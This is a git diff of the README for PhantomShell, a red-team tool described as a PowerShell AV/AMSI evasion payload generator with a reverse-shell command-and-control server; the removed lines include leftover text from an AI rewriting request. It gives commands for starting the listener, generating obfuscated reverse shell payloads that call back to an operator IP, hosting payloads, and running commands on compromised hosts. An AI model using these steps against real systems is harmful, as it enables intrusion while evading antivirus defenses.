@@ -1,13 +1,5 @@
-Below is a **clean, professional GitHub README** rewritten from your content.
-It removes clutter, improves structure, standardizes formatting, and adds professional sections typical of mature open-source security tools.
-
-Your **LinkedIn and Twitter** are integrated properly and unnecessary items (email/discord) removed as requested.
-
----
-
-# PhantomShell
-
 <div align="center">
+
 ```
   ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
   ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
@@ -23,180 +15,183 @@ Your **LinkedIn and Twitter** are integrated properly and unnecessary items (ema
        ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
 ```
 
-**Advanced PowerShell AV / AMSI Evasion Framework with Enterprise C2 Server**
+# 👻 PhantomShell
 
-PhantomShell is a red-team oriented framework designed for authorized penetration testing and adversary simulation. It combines an advanced PowerShell payload generator with a lightweight Command-and-Control (C2) infrastructure for managing compromised hosts during controlled security assessments.
+### Advanced PowerShell AV / AMSI Evasion Framework + Enterprise C2 Server
 
-The framework focuses on payload obfuscation, AMSI evasion, polymorphic payload generation, and operational command management through both a CLI and a web-based interface.
+Red-team framework designed for **authorized penetration testing and adversary simulation**.
 
----
+PhantomShell combines an **advanced PowerShell payload generator** with a **lightweight Command & Control (C2) infrastructure**, enabling red team operators to deploy, manage, and interact with compromised hosts during controlled security assessments.
 
-# Key Capabilities
-
-### Payload Generation
-
-* Multi-layer PowerShell encoding
-* AMSI-aware payload structures
-* Polymorphic payload generation
-* Variable randomization and obfuscation
-* Multiple delivery formats
-
-### Command & Control
-
-* Lightweight Python-based C2 server
-* Web interface for session management
-* Interactive command shell for operators
-* Multiple concurrent session handling
-* Session monitoring and management
-
-### Red Team Operations Support
-
-* Reverse shell generation
-* Payload hosting capability
-* Command execution on compromised hosts
-* Real-time operator interaction
+</div>
 
 ---
 
-# Architecture
+# 🚀 Features
+
+## ⚡ Payload Generation
+
+- Multi-layer PowerShell encoding
+- AMSI-aware payload structures
+- Polymorphic payload generation
+- Randomized variable obfuscation
+- Multiple delivery formats
+
+## 🎮 Command & Control
+
+- Lightweight Python C2 server
+- Web interface for session management
+- Interactive operator CLI
+- Multiple concurrent session support
+- Real-time command execution
+
+## 🎯 Red Team Operations
+
+- Reverse shell payload generation
+- HTTP payload hosting
+- Remote command execution
+- Session monitoring
+
+---
+
+# 🏗 Architecture
 
 ```
-Target System
-    │
-    │ Reverse Shell
-    ▼
+Target Machine
+      │
+      │ Reverse Shell
+      ▼
 PhantomShell C2 Server
-    │
-    ├── CLI Interface
-    │
-    └── Web Management Interface
+      │
+      ├── CLI Interface
+      │
+      └── Web Management Dashboard
 ```
 
-The payload executed on the target connects back to the PhantomShell C2 listener, allowing operators to execute commands and manage sessions through either the command line interface or the web dashboard.
+The payload executed on a target system connects back to the **PhantomShell listener**, allowing operators to control sessions through the CLI or web interface.
 
 ---
 
-# Installation
+# 📦 Installation
 
-### Requirements
+## Requirements
 
-* Python 3.8+
-* Linux or macOS host system
-* Windows target machine
+- Python **3.8+**
+- Linux or macOS host system
+- Windows target machine
 
-### Clone the Repository
+---
+
+## Clone Repository
 
 ```bash
 git clone https://github.com/adrilaw/PhantomShell.git
-
 cd PhantomShell
 ```
 
 ---
 
-# Quick Start
+# ⚡ Quick Start
 
-### Start the C2 Server
+## Start the C2 Server
 
-```
+```bash
 python3 phantomc2.py c2 --port 4444 --web-port 8080 --password StrongPassword
 ```
 
 This launches:
 
-* Reverse shell listener on port **4444**
-* Web interface on port **8080**
-
----
-
-### Generate a Reverse Shell Payload
-
-```
-python3 phantomc2.py revshell -i YOUR_IP -p 4444
-```
-
-Copy the generated payload and execute it on the target Windows system.
-
----
-
-### Access the Web Interface
-
-```
-http://YOUR_SERVER_IP:8080
-```
-
-Log in using the password defined during C2 startup.
-
----
-
-# Command Reference
-
-## Start C2 Server
-
-```
-python3 phantomc2.py c2
-```
-
-Available options:
-
-| Option       | Description                    |
-| ------------ | ------------------------------ |
-| `--host`     | Bind address                   |
-| `--port`     | Reverse shell listener port    |
-| `--web-port` | Web UI port                    |
-| `--password` | Web UI authentication password |
-| `--no-cli`   | Disable interactive CLI        |
-
-Example:
-
-```
-python3 phantomc2.py c2 --port 4444 --web-port 8080 --password RedTeam2026
-```
+- Reverse shell listener on **4444**
+- Web dashboard on **8080**
 
 ---
 
 ## Generate Reverse Shell Payload
 
-```
-python3 phantomc2.py revshell -i <IP> -p <PORT>
+```bash
+python3 phantomc2.py revshell -i YOUR_IP -p 4444
 ```
 
-Optional parameters:
+Copy the generated command and execute it on the **target Windows system**.
 
-| Option          | Description           |
-| --------------- | --------------------- |
-| `--obf-profile` | Obfuscation level     |
-| `--layers`      | Encoding layers       |
-| `--format`      | Output payload format |
-| `--enc-b64`     | Encode IP and port    |
+---
+
+## Access Web Dashboard
+
+```
+http://YOUR_SERVER_IP:8080
+```
+
+Login using the password specified when starting the C2 server.
+
+---
+
+# 🧰 Command Reference
+
+## Start C2 Server
+
+```bash
+python3 phantomc2.py c2
+```
+
+### Options
+
+| Option | Description |
+|------|-------------|
+| `--host` | Bind address |
+| `--port` | Reverse shell listener port |
+| `--web-port` | Web UI port |
+| `--password` | Web interface password |
+| `--no-cli` | Disable CLI |
 
 Example:
 
+```bash
+python3 phantomc2.py c2 --port 4444 --web-port 8080 --password RedTeam2026
 ```
+
+---
+
+## Generate Payload
+
+```bash
+python3 phantomc2.py revshell -i <IP> -p <PORT>
+```
+
+### Optional Parameters
+
+| Option | Description |
+|------|-------------|
+| `--obf-profile` | Obfuscation profile |
+| `--layers` | Encoding layers |
+| `--format` | Payload format |
+| `--enc-b64` | Encode IP and port |
+
+Example:
+
+```bash
 python3 phantomc2.py revshell -i 10.10.10.5 -p 4444 -o random -l 3
 ```
 
 ---
 
-## Payload Hosting Server
+## HTTP Payload Hosting
 
-PhantomShell can host generated payloads via HTTP.
-
-```
+```bash
 python3 phantomc2.py server -i <IP> -p <PORT>
 ```
 
 Example:
 
-```
+```bash
 python3 phantomc2.py server -i 10.10.10.5 -p 4444 --server-port 8000
 ```
 
 ---
 
-# C2 Server Operations
+# 🖥 C2 Operations
 
-Once a session connects, operators can interact with compromised hosts.
+Once a target connects, operators can manage sessions.
 
 ### List Sessions
 
@@ -210,19 +205,19 @@ sessions
 interact <session_id>
 ```
 
-### Execute Single Command
+### Execute Command
 
 ```
 exec <session_id> <command>
 ```
 
-Example:
+Example
 
 ```
 exec 1 whoami
 ```
 
-### Terminate Session
+### Kill Session
 
 ```
 kill <session_id>
@@ -230,45 +225,41 @@ kill <session_id>
 
 ---
 
-# Payload Features
+# 🔐 Payload Techniques
 
-PhantomShell implements several techniques intended to reduce detection by traditional security controls.
+PhantomShell implements several techniques to reduce detection.
 
-### Obfuscation Techniques
+### Obfuscation
 
-* Variable renaming
-* Encoded execution layers
-* Randomized payload structure
+- Variable randomization
+- Payload polymorphism
+- Encoded execution layers
 
-### Multi-Layer Encoding
-
-Payloads may be wrapped in several encoding layers before execution.
-
-Typical workflow:
+### Encoding Workflow
 
 ```
-PowerShell payload
-   ↓
-Unicode encoding
-   ↓
-Base64 encoding
-   ↓
-Execution wrapper
+PowerShell Payload
+      ↓
+Unicode Encoding
+      ↓
+Base64 Encoding
+      ↓
+Execution Wrapper
 ```
 
 ---
 
-# Example Red Team Workflow
+# 🎯 Example Red Team Workflow
 
 ### 1. Start Infrastructure
 
-```
+```bash
 python3 phantomc2.py c2 --port 4444 --web-port 8080
 ```
 
 ### 2. Generate Payload
 
-```
+```bash
 python3 phantomc2.py revshell -i 192.168.1.100 -p 4444
 ```
 
@@ -287,92 +278,90 @@ hostname
 
 ---
 
-# Security Considerations
+# 🛡 Security Considerations
 
-PhantomShell should be deployed only in controlled environments and authorised engagements.
+PhantomShell should only be used in **controlled and authorized environments**.
 
-Operational security recommendations:
+Recommended operational security practices:
 
-* Use strong passwords for the web interface
-* Restrict access via firewall rules
-* Deploy behind a reverse proxy with HTTPS
-* Monitor server logs during engagements
-* Rotate infrastructure after assessments
+- Use strong authentication passwords
+- Restrict access with firewall rules
+- Deploy behind reverse proxy with HTTPS
+- Monitor infrastructure logs
+- Rotate infrastructure after engagements
 
 ---
 
-# Troubleshooting
+# 🐛 Troubleshooting
 
-### Port Already in Use
+## Port Already In Use
 
-Check processes using the port:
+Check which process is using the port:
 
-```
+```bash
 netstat -tulpn | grep 4444
 ```
 
-Terminate conflicting processes or use another port.
-
 ---
 
-### Web Interface Not Accessible
+## Web Dashboard Not Accessible
 
-Verify that the web service is running:
+Check if the service is listening:
 
-```
+```bash
 netstat -tulpn | grep 8080
 ```
 
-Check firewall configuration if the service is listening but unreachable.
+Verify firewall rules if necessary.
 
 ---
 
-# Roadmap
+# 🛣 Roadmap
 
-Planned enhancements include:
+Future development plans include:
 
-* Encrypted C2 communications
-* Database backend for session persistence
-* Role-based multi-user access
-* File upload and download capabilities
-* SOCKS proxy support through compromised hosts
-* Plugin architecture for extensions
+- Encrypted C2 communications
+- Database-backed session persistence
+- Multi-user role-based access control
+- File upload and download capabilities
+- SOCKS proxy pivoting
+- Plugin architecture
 
 ---
 
-# Contributing
+# 🤝 Contributing
 
 Contributions are welcome.
 
-Typical contribution areas include:
+Possible contribution areas:
 
-* Additional payload obfuscation techniques
-* New payload delivery formats
-* Improvements to the C2 server
-* Documentation improvements
-* Cross-platform testing
+- Additional obfuscation techniques
+- New payload delivery formats
+- C2 server improvements
+- Documentation
+- Cross-platform testing
 
 Workflow:
 
 ```
-git clone
-create feature branch
-implement changes
-submit pull request
+Fork repository
+Create feature branch
+Commit improvements
+Submit pull request
 ```
 
 ---
 
-# Legal Disclaimer
+# ⚠ Legal Disclaimer
 
-This software is intended **exclusively for authorised security testing and research**.
+This software is intended **exclusively for authorised cybersecurity testing**.
 
-Acceptable use includes:
+Allowed uses include:
 
-* Authorized penetration testing engagements
-* Red team operations with written permission
-* Cybersecurity research environments
-* Capture-the-Flag competitions
+- Authorized penetration testing
+- Red team engagements
+- Security research
+- Capture-the-Flag environments
 
 Unauthorized use against systems without explicit permission may violate computer crime laws.
 
@@ -380,40 +369,44 @@ The author assumes **no responsibility for misuse**.
 
 ---
 
-## 📜 **License**
+# 📜 License
 
-ELIANA is licensed under the:
+This project is licensed under:
 
-[GNU General Public License](LICENSE)
+**GNU General Public License**
 
-[PhantomShell Commercial License](C-LICENSE)
+See `LICENSE` for details.
 
 ---
 
-# Credits
+# 🙏 Credits
 
-PhantomShell builds on concepts and research from the offensive security community.
+PhantomShell builds on concepts from the offensive security community.
 
 Inspirations include:
 
-* Nishang PowerShell framework
-* AMSI bypass research
-* Red team tooling such as Cobalt Strike and Metasploit
+- Nishang PowerShell framework
+- AMSI bypass research
+- Red team tools such as Cobalt Strike and Metasploit
 
 ---
 
-# Author
+# 👨‍💻 Author
 
 **Adrien Dodin**
 
-Cybersecurity Enthusiast | Offensive Security | Red Teaming
+Cybersecurity | Offensive Security | Red Teaming
 
-LinkedIn
-[https://www.linkedin.com/in/dodin-mel-adrien-lawrence-enzo-5568b91b5/](https://www.linkedin.com/in/dodin-mel-adrien-lawrence-enzo-5568b91b5/)
+🔗 LinkedIn  
+https://www.linkedin.com/in/dodin-mel-adrien-lawrence-enzo-5568b91b5/
 
-Twitter
-[https://twitter.com/AdrienDodin](https://twitter.com/AdrienDodin)
+🐦 Twitter  
+https://twitter.com/AdrienDodin
 
 ---
 
+<div align="center">
+
 ⭐ If this project helped you during research or a security engagement, consider starring the repository.
+
+</div>
